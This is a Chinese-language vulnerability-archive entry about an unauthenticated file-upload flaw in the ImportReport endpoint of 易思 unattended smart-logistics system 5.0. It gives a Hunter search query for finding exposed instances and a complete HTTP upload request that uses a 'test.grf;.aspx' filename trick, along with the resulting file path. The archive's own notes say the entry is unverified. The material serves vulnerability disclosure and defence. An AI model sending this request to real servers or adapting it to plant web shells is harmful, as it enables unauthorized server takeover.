---
source: "wy876 漏洞文库"
title: "易思智能物流无人值守 ImportReport后缀上传"
product: "易思智能物流无人值守"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "5.0声明，ASP.NET解析与输出目录"
prerequisites: "无Cookie且声明未授权"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/uklfg9x4h2md4vgi"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9FImportReport%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
hunter: "web.body==\"易思无人值守智能物流\""
id: "vw-577748c360784036b4db497c"
entity_id: "ve-577748c360784036b4db497c"
schema_version: "1"
previous_fofa_unverified: "web.body=="
---

# 易思智能物流无人值守 ImportReport后缀上传

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：易思智能物流无人值守；ImportReport后缀上传
- 版本、配置及部署条件：5.0声明，ASP.NET解析与输出目录
- 认证与权限前提：无Cookie且声明未授权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- test.grf；.aspx到encode=b决定b.aspx的映射需根因，不能普通后缀断言
- 纯文本test回读不足证明执行；响应缺失
- Hunterweb.body==误fofa并截断，修复版本无

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
易思无人值守智能物流系统是一款集成了人工智能、机器人技术和物联网技术的创新产品。它能够自主完成货物存储、检索、分拣、装载以及配送等物流作业，帮助企业实现无人值守的智能物流运营，提高效率、降低成本，为现代物流行业带来新的发展机遇。Sys_ReportFile/ImportReport接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。

## 二、影响版本
+ 易思智能物流无人值守系统5.0

## 三、资产测绘
+ hunter`web.body=="易思无人值守智能物流"`
+ 登录页面


## 四、漏洞复现
```http
POST /Sys_ReportFile/ImportReport?encode=b HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 130
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="test.grf;.aspx"

test
--00content0boundary00--
```

> 请求长度说明：原资料 Content-Length 为 130；保留原始标头；其数值未据实际请求体重新计算或验证。

---


上传文件位置

```plain
http://xx.xx.xx.xx/GRF/Custom/b.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uklfg9x4h2md4vgi>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
